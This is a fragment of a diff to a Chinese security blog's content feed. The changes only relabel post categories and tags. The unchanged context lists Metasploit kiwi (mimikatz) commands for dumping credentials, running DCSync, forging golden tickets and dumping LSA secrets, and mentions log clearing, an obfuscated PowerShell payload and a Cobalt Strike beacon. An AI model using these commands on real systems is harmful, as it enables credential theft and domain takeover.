 <h2 id="kiwi模块"><a href="#kiwi模块" class="headerlink" title="kiwi模块"></a>kiwi模块</h2><p>kiwi模块要在system权限下才能使用：<br>    creds_all：列举所有凭据<br>    creds_kerberos：列举所有kerberos凭据<br>    creds_msv：列举所有msv凭据<br>    creds_ssp：列举所有ssp凭据<br>    creds_tspkg：列举所有tspkg凭据<br>    creds_wdigest：列举所有wdigest凭据<br>    dcsync：通过DCSync检索用户帐户信息<br>    dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID<br>    golden_ticket_create：创建黄金票据<br>    kerberos_ticket_list：列举kerberos票据<br>    kerberos_ticket_purge：清除kerberos票据<br>    kerberos_ticket_use：使用kerberos票据<br>    kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令<br>    lsa_dump_sam：dump出lsa的SAM<br>    lsa_dump_secrets：dump出lsa的密文<br>    password_change：修改密码<br>    wifi_list：列出当前用户的wifi配置文件<br>    wifi_list_shared：列出共享wifi配置文件&#x2F;编码</p>
 ]]></content>
       <categories>
-        <category>web攻防</category>
+        <category>工具使用</category>
       </categories>
       <tags>
         <tag>web攻防</tag>
@@ -1708,7 +1931,7 @@ clearev                                                 #清除日志
 <p>8、而进行混淆后的pay111.ps1还可以运行。<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151647965.png"><br><br></p>
 ]]></content>
       <categories>
-        <category>web攻防</category>
+        <category>工具使用</category>
       </categories>
       <tags>
         <tag>web攻防</tag>
@@ -1735,7 +1958,7 @@ clearev                                                 #清除日志
 <p>3、下载文件后将文件后缀改回exe即可运行并连接cobalt strike。<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151638418.png"></p>
 ]]></content>
       <categories>
-        <category>web攻防</category>
+        <category>工具使用</category>
       </categories>
       <tags>
         <tag>web攻防</tag>
@@ -1764,7 +1987,7 @@ clearev                                                 #清除日志
 <p>10、以下是两个简单的操作。值得注意的是：在执行命令时，需要在命令前添加”shell”<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151649881.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151649383.png"></p>
 ]]></content>
       <categories>
-        <category>web攻防</category>
+        <category>工具使用</category>
       </categories>
       <tags>
         <tag>web攻防</tag>
@@ -1786,11 +2009,11 @@ clearev                                                 #清除日志
 <p>8、如果在访问网站时需要验证时,可以在用户组里创建一个用户以进行验证并访问网站(我已经验证过了所以没有弹出框可以截出来)<br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151700132.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151700597.png"><br><img src="https://xrzm-img.oss-cn-guangzhou.aliyuncs.com/xrzmblog-img/202407151700115.png"></p>
 ]]></content>
       <categories>
-        <category>web攻防</category>
+        <category>靶场搭建</category>
       </categories>
       <tags>
         <tag>web攻防</tag>
-        <tag>靶场</tag>
+        <tag>靶场搭建</tag>
       </tags>
   </entry>
   <entry>
